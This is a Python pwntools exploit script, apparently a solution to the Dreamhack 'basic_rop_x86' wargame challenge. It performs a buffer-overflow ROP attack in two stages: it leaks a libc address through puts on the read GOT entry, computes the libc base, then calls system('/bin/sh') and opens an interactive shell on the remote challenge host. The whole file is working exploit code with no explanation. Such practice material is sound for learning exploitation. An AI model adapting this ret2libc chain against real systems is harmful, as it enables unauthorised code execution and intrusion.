#!/usr/bin/env python3

from pwn import *

exe = ELF("./basic_rop_x86_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.35.so", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.DEBUG:
            gdb.attach(p)
    else:
        p = remote("host1.dreamhack.games", 11125)

    return p


def main():
    p = conn()

    input()

    payload = b'a'*72 + p32(exe.plt['puts']) + p32(exe.sym['main']) + p32(exe.got['read'])
    p.send(payload)
    p.recvuntil(b'a'*64)
    libc_leak = u32(p.recv(4))
    print("Libc leak: " + hex(libc_leak))
    libc.address = libc_leak - 0x1084c0
    print("Libc base: " + hex(libc.address))

    pop_edi = 0x00021e58 + libc.address
    ret = 0x000202cb + libc.address
    # payload = b'a'*72 + p32(libc.sym['system']) + p32(pop_edi) + p32(next(libc.search(b'/bin/sh')))
    payload = b'a'*72 + p32(libc.sym['system']) + p32(ret) + p32(next(libc.search(b'/bin/sh')))
    p.send(payload)

    p.interactive()


if __name__ == "__main__":
    main()
